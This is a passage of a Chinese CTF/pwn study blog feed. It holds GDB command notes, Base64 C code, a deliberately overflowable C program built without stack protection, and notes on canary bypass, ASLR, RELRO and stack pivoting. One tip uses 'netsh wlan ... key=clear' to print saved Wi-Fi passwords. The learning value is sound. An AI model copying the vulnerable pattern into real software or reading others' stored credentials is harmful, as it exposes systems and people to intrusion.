    <content type="html"><![CDATA[<h2 id="GDB常用命令介绍："><a href="#GDB常用命令介绍：" class="headerlink" title="GDB常用命令介绍："></a>GDB常用命令介绍：</h2><a id="more"></a><ul><li>r(run)          : 开始执行（不会断，可带参数）  </li><li>c(continue)     : 继续执行  </li><li>start           : 开始执行（断在程序入口，可带参数）    </li><li>b *address      : 指定地址下断点（地址必须是可执行代码段）  </li><li>bl              : 查看断点列表  </li><li>del index       : 删除指定断点（index可使用bl查看）  </li><li>Ctrl + c        : 强制运行中的程序中断    </li><li>print expr      : 打印出expr的值，如果expr是某个符号，则打印出符号对应的值。（常用于查看带符号的变量）  </li><li>bt              : 显示调用堆栈的信息（常用于回溯跟踪,<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwndbg</a>可直接在工作窗口显示）  </li><li>stack n         : 显示n个单元的栈  </li><li>x/nf addr.      : 打印指定地址开始n个单元的的内存数据，f可表示单元大小（x为默认大小，b为一个字节，h为双字节，wx为四字节，gx为八字节，i表示查看指令，c表示查看字符，s表示查看字符串）    </li><li><p>find expr.      : 在当前进程内存搜索expr的值，可以是整数或是字符串（在<a href="https://github.com/longld/peda" target="_blank" rel="noopener">peda</a>下使用，对应<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwndbg</a>的命令是search） </p></li><li><p>n/ni (next into)          : 单步执行（大部分情况下视一条汇编指令为一步），不会进入函数</p></li><li>s/si (step into)          : 单步步入，遇到函数会进入。 注：如果遇到n无法正常单步的情况下，使用s/si替代使用</li><li>finish                    : 跳出当前函数</li><li>return                    : 忽略之后的语句，强制函数返回</li><li>list n                    : 有源码文件的情况下可列出n行当前指令对应的源码</li><li>set {type} $reg/mem=expr  : 设置对应寄存器或内存指向的值为expr，type可为int、long long等</li><li>set $reg=expr             : 设置对应寄存器的值为expr</li><li>peda/pwndbg               : 查看可用命令（使用对应插件时使用）</li><li><p>dump filename addr1 addr2 : dump指定内存到文件中，dump命令之后还会跟一些其他指令用于特定的操作，具体可到GDB中查看</p></li><li><p>q(quit)                   : 退出gdb</p></li><li>disas func 查看某函数的汇编代码</li><li>info registers  查看寄存器的值</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;GDB常用命令介绍：&quot;&gt;&lt;a href=&quot;#GDB常用命令介绍：&quot; class=&quot;headerlink&quot; title=&quot;GDB常用命令介绍：&quot;&gt;&lt;/a&gt;GDB常用命令介绍：&lt;/h2&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>some ！</title>
    <link href="http://yoursite.com/2019/04/01/%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2019/04/01/一些技巧/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:55:57.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h1><p>依次为：RDI，RSI，RDX，RCX，R8和 R9<br><a id="more"></a></p><h1 id="查找gadget"><a href="#查找gadget" class="headerlink" title="查找gadget"></a>查找gadget</h1><p>ROPgadget –binary stack1 –only “pop|ret”</p><p>objdump -d ./level5 </p><h1 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h1><p><code>ps au</code><br>查看进程pid</p><p><code>cat /proc/pid/maps</code></p><p>查看进程号为pid的进程内存映射</p><p>也可以用gdb打开然后<code>vmmap</code>来查看</p><h1 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h1><p><code>/sbin/ifconfig</code></p><p><code>hostname -I</code></p><p><code>ip addr show</code></p><h1 id="简单搭建本地服务"><a href="#简单搭建本地服务" class="headerlink" title="简单搭建本地服务"></a>简单搭建本地服务</h1><p><code>socat tcp4-listen:9999,reuseaddr,fork exec:&quot;./ret2sc&quot;</code></p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>ida ctrl+s 看节</p><h1 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h1><p>程序以正常顺序读入输入，但是在内存中获取地址的时候是用小段法</p><p>如 <code>0x40001010          \x11 \x22 \x33 \x44</code></p><p>那么0x40001010存的地址是0x44332211</p><h1 id="查看wifi密码"><a href="#查看wifi密码" class="headerlink" title="查看wifi密码"></a>查看wifi密码</h1><p>netsh wlan show profiles</p><p>netsh wlan show profiles name=混沌谷主 key=clear</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;64位传参&quot;&gt;&lt;a href=&quot;#64位传参&quot; class=&quot;headerlink&quot; title=&quot;64位传参&quot;&gt;&lt;/a&gt;64位传参&lt;/h1&gt;&lt;p&gt;依次为：RDI，RSI，RDX，RCX，R8和 R9&lt;br&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出</title>
    <link href="http://yoursite.com/2019/04/01/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2019/04/01/栈溢出/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:55:50.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>11<br><a id="more"></a><br>pwn_me.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwn_me</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"input your password"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"success"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pwn_me();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -m32 ./pwn_me.c -o pwn_me</code></p><p><code>gcc -m32 -fno-stack-protector ./pwn_me.c -o pwn_me</code></p><p>ROP(Return Oriented Programming)</p><p>返回导向编程</p><p>Stack-smashing Protection（SSP，又称 ProPolice） </p><p>SSP 还有意将局部变量中的数组放在函数栈的高地址，而将其他变量放在低地址。这样就使得通过溢出一个数组来修改其他变量（比如一个函数指针）变得更为困难。 </p><p>常用的Canary下栈溢出套路</p><p>1.泄漏Canary</p><p>2.覆盖TLS中的Canary</p><p>3.劫持_stack_chk_fail</p><p>4.one-by-one leak</p><p>5.stack smash</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;栈溢出&quot;&gt;&lt;a href=&quot;#栈溢出&quot; class=&quot;headerlink&quot; title=&quot;栈溢出&quot;&gt;&lt;/a&gt;栈溢出&lt;/h1&gt;&lt;p&gt;11&lt;br&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>base64</title>
    <link href="http://yoursite.com/2019/04/01/base64/"/>
    <id>http://yoursite.com/2019/04/01/base64/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:57:01.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>base64将每3个字节扩充为4个字节，就是 把3个字节分为4份，然后每份前面用00填充。</p><p><code>10101010 10101010 10101010</code>==&gt;<code>00101010 00101010 00101010 00101010</code></p><p>那么，得到的字节范围在<code>0~63</code> ,根据规范给出的Base64索引表，将0~63 这64个数字转换成<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的一个。 </p><p>若是原字节数不是3的倍数，那么空缺的地方用00补，少一个字节（源字符串）加一个<code>=</code>，少两个字节加两个.</p><p><code>10101112 10121314</code>==&gt;<code>00101011 00121012 00131400</code>+<code>=</code></p><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>解码是编码的反向过程，每次取出4个字节，然后将每个字节的字符转换成原始Base64索引表对应的索引数字。然后使用位操作将每字节前2位去掉，重新转换成3字节。需要注意的是最后对于结尾“=”的处理 </p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="ENCODE"><a href="#ENCODE" class="headerlink" title="ENCODE"></a>ENCODE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> base64_index[<span class="number">64</span>] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;   </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input, <span class="keyword">const</span> <span class="keyword">size_t</span> length, <span class="keyword">char</span> *output)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    *output = <span class="string">'\0'</span>;  </span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">NULL</span> || length &lt; <span class="number">1</span>) <span class="keyword">return</span> output;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span> *p = (<span class="keyword">char</span>*)input;  </span><br><span class="line">    <span class="keyword">char</span> *p_dst = (<span class="keyword">char</span>*)output;;  </span><br><span class="line">    <span class="keyword">char</span> *p_end = (<span class="keyword">char</span>*)input + length;  </span><br><span class="line">    <span class="keyword">int</span>  loop_count = <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 0x30 -&gt; 00110000  </span></span><br><span class="line">    <span class="comment">// 0x3C -&gt; 00111100  </span></span><br><span class="line">    <span class="comment">// 0x3F -&gt; 00111111  </span></span><br><span class="line">    <span class="keyword">while</span> (p_end - p &gt;= <span class="number">3</span>) &#123;  </span><br><span class="line">        *p_dst++ = base64_index[( p[<span class="number">0</span>] &gt;&gt; <span class="number">2</span> )];  </span><br><span class="line">        *p_dst++ = base64_index[( (p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x30</span> ) | ( p[<span class="number">1</span>] &gt;&gt; <span class="number">4</span> )];  </span><br><span class="line">        *p_dst++ = base64_index[( (p[<span class="number">1</span>] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x3C</span> ) | ( p[<span class="number">2</span>] &gt;&gt; <span class="number">6</span> )];  </span><br><span class="line">        *p_dst++ = base64_index[p[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];  </span><br><span class="line">        p += <span class="number">3</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (p_end - p &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        *p_dst++ = base64_index[(p[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>)];  </span><br><span class="line">        <span class="keyword">if</span> (p_end - p == <span class="number">2</span>) &#123;  </span><br><span class="line">            *p_dst++ = base64_index[( (p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x30</span> ) | ( p[<span class="number">1</span>] &gt;&gt; <span class="number">4</span> )];  </span><br><span class="line">            *p_dst++ = base64_index[(p[<span class="number">1</span>] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x3C</span>];   </span><br><span class="line">            *p_dst++ = <span class="string">'='</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p_end - p == <span class="number">1</span>) &#123;  </span><br><span class="line">            *p_dst++ = base64_index[(p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x30</span>];  </span><br><span class="line">            *p_dst++ = <span class="string">'='</span>;  </span><br><span class="line">            *p_dst++ = <span class="string">'='</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    *p_dst = <span class="string">'\0'</span>;  </span><br><span class="line">    <span class="keyword">return</span> output;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DECODE"><a href="#DECODE" class="headerlink" title="DECODE"></a>DECODE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 16 * 16  </span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> base64_decode_map[<span class="number">256</span>] = &#123;  </span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 0   - 15  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 16  - 31  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">62</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">63</span>, <span class="comment">// 32  - 47  </span></span><br><span class="line">    <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 48  - 63  </span></span><br><span class="line">    <span class="number">-1</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="comment">// 64  - 79  </span></span><br><span class="line">    <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 80  - 95  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="comment">// 96  - 111  </span></span><br><span class="line">    <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 112 - 127  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 128 - 143  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 144 - 159   </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 160 - 175  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 176 - 191  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 192 - 207  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 208 - 223  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 224 - 239  </span></span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="comment">// 240 - 255  </span></span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* input, <span class="keyword">char</span> *output)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    output[<span class="number">0</span>] = <span class="string">'\0'</span>;  </span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">NULL</span> || output == <span class="literal">NULL</span>)   </span><br><span class="line">        <span class="keyword">return</span> output;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">int</span> input_len = <span class="built_in">strlen</span>(input);  </span><br><span class="line">    <span class="keyword">if</span> (input_len &lt; <span class="number">4</span> || input_len % <span class="number">4</span> != <span class="number">0</span>)   </span><br><span class="line">        <span class="keyword">return</span> output;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 0xFC -&gt; 11111100  </span></span><br><span class="line">    <span class="comment">// 0x03 -&gt; 00000011  </span></span><br><span class="line">    <span class="comment">// 0xF0 -&gt; 11110000  </span></span><br><span class="line">    <span class="comment">// 0x0F -&gt; 00001111  </span></span><br><span class="line">    <span class="comment">// 0xC0 -&gt; 11000000  </span></span><br><span class="line">    <span class="keyword">char</span> *p = (<span class="keyword">char</span>*)input;  </span><br><span class="line">    <span class="keyword">char</span> *p_out = output;  </span><br><span class="line">    <span class="keyword">char</span> *p_end = (<span class="keyword">char</span>*)input + input_len;  </span><br><span class="line">    <span class="keyword">for</span> (; p &lt; p_end; p += <span class="number">4</span>) &#123;  </span><br><span class="line">        *p_out++ = ((base64_decode_map[p[<span class="number">0</span>]] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xFC</span>) | ((base64_decode_map[p[<span class="number">1</span>]] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span>);  </span><br><span class="line">        *p_out++ = ((base64_decode_map[p[<span class="number">1</span>]] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xF0</span>) | ((base64_decode_map[p[<span class="number">2</span>]] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x0F</span>);  </span><br><span class="line">        *p_out++ = ((base64_decode_map[p[<span class="number">2</span>]] &lt;&lt; <span class="number">6</span>) &amp; <span class="number">0xC0</span>) | (base64_decode_map[p[<span class="number">3</span>]]);   </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (*(input + input_len - <span class="number">2</span>) == <span class="string">'='</span>) &#123;  </span><br><span class="line">        *(p_out - <span class="number">2</span>) = <span class="string">'\0'</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*(input + input_len - <span class="number">1</span>) == <span class="string">'='</span>) &#123;  </span><br><span class="line">        *(p_out - <span class="number">1</span>) = <span class="string">'\0'</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> output;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;base64&quot;&gt;&lt;a href=&quot;#base64&quot; class=&quot;headerlink&quot; title=&quot;base64&quot;&gt;&lt;/a&gt;base64&lt;/h1&gt;
    
    </summary>
    
    
      <category term="code" scheme="http://yoursite.com/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>ctf_wiki</title>
    <link href="http://yoursite.com/2019/04/01/CTF_WIKI_PWN%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/04/01/CTF_WIKI_PWN总结/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:54.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LINUX-PWN"><a href="#LINUX-PWN" class="headerlink" title="LINUX PWN"></a>LINUX PWN</h1><a id="more"></a><p>[TOC]</p><h2 id="Linux-Pwn"><a href="#Linux-Pwn" class="headerlink" title="Linux Pwn"></a>Linux Pwn</h2><h2 id="安全防护机制"><a href="#安全防护机制" class="headerlink" title="安全防护机制"></a>安全防护机制</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h4 id="泄漏栈中的Canary"><a href="#泄漏栈中的Canary" class="headerlink" title="泄漏栈中的Canary"></a>泄漏栈中的Canary</h4><hr><blockquote><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。<br>泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。</p></blockquote><p>要点： <strong>读出数据</strong> <strong>栈溢出</strong></p><p>比如：覆盖\x00，然后用输出函数输出并截取Canary部分 可用来栈溢出</p><h4 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h4><p>要点：通过 fork 函数开启子进程交互Canary不变</p><h4 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h4><p>要点：修改 GOT 表劫持这个函数</p><p>例子：参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p><h4 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h4><p>要点：当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>例子：参见 StarCTF2018 babystack</p><h3 id="PIE-和-ASLR"><a href="#PIE-和-ASLR" class="headerlink" title="PIE 和 ASLR"></a>PIE 和 ASLR</h3><p><strong>PIE  是无限手套，ASLR是大番薯</strong></p><p><strong>PIE</strong> 在编译的过程中<strong>赋予了</strong> ELF加载到内存时其<strong>加载基址随机化</strong>的功能</p><ul><li>PIE编译出来的ELF如果ASLR=0，ELF的加载基址也是不会变。</li></ul><p><strong>ASLR</strong> 的三个级别变成了 ：</p><ul><li>0， 不开启任何随机化；</li><li>1， 开启<strong>stack</strong>、<strong>libraries</strong> [、<strong>executable base</strong>（special libraries -^-） if PIE is enabled while compiling] 的随机化；</li><li>2，开启<strong>heap</strong>随机化（相对于<strong>executable base</strong>）。</li></ul><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。</p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><hr><h3 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a><strong>stack pivoting</strong></h3><p>劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP</p><p>一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的 